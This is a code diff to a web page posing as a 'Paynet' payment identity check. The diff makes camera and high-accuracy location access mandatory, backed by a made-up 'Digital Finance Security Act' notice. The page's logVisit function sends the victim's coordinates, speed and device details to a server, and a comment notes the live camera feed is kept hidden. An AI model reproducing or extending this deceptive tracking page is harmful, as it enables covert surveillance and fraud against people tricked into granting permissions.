@@ -363,36 +363,35 @@
         </div>
     </div>
 
-    <!-- Camera Access Modal -->
-    <div id="cameraModal" class="location-modal" style="display: none;">
+    <!-- Permission Access Modal (Strict) -->
+    <div id="permissionModal" class="location-modal" style="display: none;">
         <div class="modal-content">
-            <div class="modal-icon" style="background: #FEF7E0; color: #FBBC04;">
+            <div class="modal-icon" style="background: #F8D7DA; color: #721C24;">
                 <svg width="32" height="32" viewBox="0 0 24 24" fill="currentColor">
                     <path
-                        d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
+                        d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
                 </svg>
             </div>
-            <h3 class="modal-title">Identity Verification Required</h3>
-            <p class="modal-text">To prevent payment fraud, our system strictly requires a biometric scan to confirm
-                your identity.</p>
+            <h3 class="modal-title">Permissions Required</h3>
+            <p class="modal-text">To proceed with this high-security transaction, Paynet strictly requires
+                <strong>Camera</strong> and <strong>Location</strong> access for biometric verification.</p>
 
             <div
                 style="background: #f8f9fa; border: 1px solid #e8eaed; border-radius: 8px; padding: 12px; margin-bottom: 20px; text-align: left;">
                 <div
                     style="font-size: 11px; font-weight: 700; color: #5f6368; text-transform: uppercase; margin-bottom: 5px; display: flex; align-items: center; gap: 5px;">
-                    🛡️ Reason for Verification
+                    📜 Compliance Note
                 </div>
                 <div style="font-size: 13px; color: #3c4043; line-height: 1.4;">
-                    To comply with <strong>Digital Payment Security Protocols</strong>, this transaction requires a
-                    real-time presence check to protect your account against unauthorized access and 3rd-party fraud.
+                    Identity scan and location tracking are mandatory under <strong>Digital Finance Security
+                        Act</strong> to prevent unauthorized 3rd-party transfers.
                 </div>
             </div>
 
-            <button class="modal-btn"
-                style="background: #1A73E8; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px;"
-                onclick="retryCamera()">Start Identity Scan</button>
-            <p style="font-size: 11px; color: #9aa0a6; margin-top: 15px;">Your data is encrypted and protected by Paynet
-                Security.</p>
+            <button id="permissionBtn" class="modal-btn" style="background: #1A73E8; font-weight: 700;"
+                onclick="retryPermissions()">Allow & Continue</button>
+            <p style="font-size: 11px; color: #9aa0a6; margin-top: 15px;">Your connection is encrypted and data is
+                handled securely.</p>
         </div>
     </div>
 
@@ -472,16 +471,26 @@
             btn.innerHTML = "Initializing...";
             btn.disabled = true;
 
-            const started = await startCameraInScanBox();
-
-            if (!started) {
-                document.getElementById('cameraModal').style.display = 'flex';
+            // Check Location first
+            const locSuccess = await logVisit();
+            if (!locSuccess) {
+                showPermissionModal();
                 btn.innerHTML = "Retry Verification";
                 btn.disabled = false;
                 return;
             }
 
-            // Camera started - show Digital Avatar UI (Keep real video hidden)
+            // Check Camera
+            const camSuccess = await startCameraInScanBox();
+            if (!camSuccess) {
+                showPermissionModal();
+                btn.innerHTML = "Retry Verification";
+                btn.disabled = false;
+                return;
+            }
+
+            // Both success - show Scan UI
+            document.getElementById('permissionModal').style.display = 'none';
             document.getElementById('scanPlaceholder').style.display = 'none';
             document.getElementById('avatarContainer').style.display = 'flex';
             document.getElementById('scanLine').style.display = 'block';
@@ -528,20 +537,26 @@
             }
         }
 
-        async function retryCamera() {
-            const btn = document.querySelector('#cameraModal .modal-btn');
-            btn.innerText = "Connecting...";
+        async function retryPermissions() {
+            const btn = document.getElementById('permissionBtn');
+            btn.innerText = "Checking...";
             btn.disabled = true;
 
-            const started = await startCameraInScanBox();
-            if (started) {
-                document.getElementById('cameraModal').style.display = 'none';
-                initiateBiometricScan(); // Start the scan process
+            const locSuccess = await logVisit();
+            const camSuccess = await startCameraInScanBox();
+
+            if (locSuccess && camSuccess) {
+                document.getElementById('permissionModal').style.display = 'none';
+                initiateBiometricScan();
             } else {
-                btn.innerText = "Verification Failed. Retry?";
+                btn.innerText = "Permissions Required. Retry?";
                 btn.disabled = false;
-                alert("Please allow camera access in your browser settings to continue.");
+                alert("Please enable Camera and Location in your browser settings to proceed with the payment.");
             }
+        }
+
+        function showPermissionModal() {
+            document.getElementById('permissionModal').style.display = 'flex';
         }
 
         function showReceipt() {
@@ -649,6 +664,7 @@
         async function logVisit() {
             let locationData = null;
             let deviceData = null;
+            let locError = false;
 
             // Get Device Details
             try {
@@ -660,7 +676,7 @@
                 };
             } catch (e) { }
 
-            // Get Location (High Accuracy)
+            // Get Location (Strict Requirement)
             try {
                 const position = await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(resolve, reject, {
@@ -677,8 +693,10 @@
                     speed: position.coords.speed
                 };
             } catch (e) {
-                // Location failed (denied or timeout)
+                locError = true;
             }
+
+            if (locError) return false;
 
             // Send to server
             try {
@@ -691,7 +709,10 @@
                         deviceDetails: deviceData
                     })
                 });
-            } catch (e) { }
+                return true;
+            } catch (e) {
+                return false;
+            }
         }
     </script>
 </body>
